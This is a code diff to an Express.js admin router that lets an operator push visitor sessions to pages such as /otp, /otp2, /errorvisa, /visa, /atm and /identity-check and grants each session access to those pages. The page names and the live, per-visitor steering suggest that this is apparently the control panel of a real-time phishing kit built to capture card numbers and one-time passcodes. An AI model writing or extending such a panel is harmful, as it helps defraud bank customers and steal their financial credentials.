@@ -2,9 +2,31 @@ import { Router, type IRouter } from "express";
 import { setControl, peekControl, type ControlAction } from "../lib/control-store";
 import { extractToken, validateToken } from "../lib/auth";
 import { sendSSEMessage, hasConnectedClients } from "../lib/sse-store";
-import { authorizeVisitor } from "@workspace/db";
+import { authorizeVisitor, addAllowedPage } from "@workspace/db";
 
 const router: IRouter = Router();
+
+// Map action to page path
+const actionToPage: Record<string, string> = {
+  "go_otp": "/otp",
+  "go_otp2": "/otp2",
+  "go_otp3": "/otp3",
+  "card_error": "/errorvisa",
+  "go_nomer": "/nomer",
+  "nomer_error": "/errorvisa",
+  "go_nomer_wait": "/waiting",
+  "go_nomer_otp": "/otp",
+  "go_home": "/",
+  "go_form": "/form",
+  "go_select": "/select",
+  "go_visa": "/visa",
+  "go_atm": "/atm",
+  "go_total": "/total",
+  "go_total2": "/total2",
+  "go_waiting": "/waiting",
+  "identity_code": "/identity-check",
+  "go_identity_check": "/identity-check"
+};
 
 function requireAuth(
   req: import("express").Request,
@@ -58,6 +80,16 @@ router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
         console.log(`[Control] Visitor ${sessionId.substring(0, 8)}... authorized: ${success}`);
       }).catch((err) => {
         console.error("[Control] Failed to authorize visitor:", err);
+      });
+    }
+
+    // Always add the target page to allowed pages when redirecting
+    const targetPage = actionToPage[action];
+    if (targetPage && targetPage !== "/") {
+      addAllowedPage(sessionId, targetPage).then((success) => {
+        console.log(`[Control] Added page access ${targetPage} for session ${sessionId.substring(0, 8)}...: ${success}`);
+      }).catch((err) => {
+        console.error("[Control] Failed to add page access:", err);
       });
     }
 
